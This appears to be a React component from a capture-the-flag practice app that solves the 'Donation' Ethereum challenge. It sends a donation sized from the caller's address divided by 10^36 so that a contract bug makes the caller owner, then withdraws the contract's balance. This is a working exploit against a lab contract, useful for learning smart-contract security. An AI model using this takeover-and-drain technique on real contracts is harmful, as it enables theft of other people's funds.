import React from 'react';
import loadInstance from '../utilities/loadInstance';
import CaptureRow from "./CaptureRow";
import { getNetworkContract } from '../utilities/networkUtilities';
import { getTransactionReceipt } from '../utilities/getTransactionReceipt';
import { BigNumber } from 'ethers';

const donationAbi = require('../abi/DonationChallenge.json').abi;
const overflowEther = BigNumber.from(`10`).pow(`36`);

export default function Donation (props) {
    const [donationInstance, setDonationInstance] = React.useState();
    const [isComplete, setIsComplete] = React.useState(undefined);
    const [balance, setBalance] = React.useState();

    if (props.web3 && props.accounts && props.networkType) {
        if (!donationInstance)
            loadInstance(donationAbi, getNetworkContract(props.networkType, "DonationChallengeContract"), setDonationInstance, props.accounts, props.web3);
    }

    const OnClickDonation = async (event) => {
        event.preventDefault();
        if (!isComplete) {
            debugger;
            const myAddr = BigNumber.from(props.accounts[0]);
            const amount = myAddr.div(overflowEther);
            // make me the owner
            if (balance === "1") {
                donationInstance.methods.donate(props.accounts[0]).send({ from: props.accounts[0], value: amount }, async function (error, txHash) {
                    if (error)
                        alert(`Failed: ${error.message}`);
                    else
                    {
                        debugger;
                        getTransactionReceipt(txHash, props.web3);
                        checkCompleted();
                        await donationInstance.methods.withdraw().call();
                    }
                });
            }
            else {
                await donationInstance.methods.withdraw().send({from: props.accounts[0]});
                checkCompleted();
            }
        }
        else
            alert(`already completed`)
    }

    const getButton = () => {
        return (
            <>
                <button disabled={!donationInstance} onClick={OnClickDonation}>Donation</button>
            </>
        );
    }

    const checkCompleted = () => {
        if (props.web3 && props.accounts && donationInstance) {
            console.log(`donation.checkCompleted`);
            donationInstance.methods.isComplete().call().then(completed => setIsComplete(completed), 
                err => alert(`donation.isComplete: ${err}`));
            props.web3.eth.getBalance(donationInstance._address).then(balance => {
                var wei = props.web3.utils.fromWei(balance);
                setBalance(wei);
            }, err => alert(`donation.getBalance: ${err}`));
        }
    }

    const getCompleted = () => {
        if (!donationInstance) {
            return "loading";
        }
        checkCompleted();
        return isComplete ? "true" : "false";
    }

    return (
        <CaptureRow name="Donation" blocks="" action={getButton()} balance={balance} completed={getCompleted()} />
    );
}
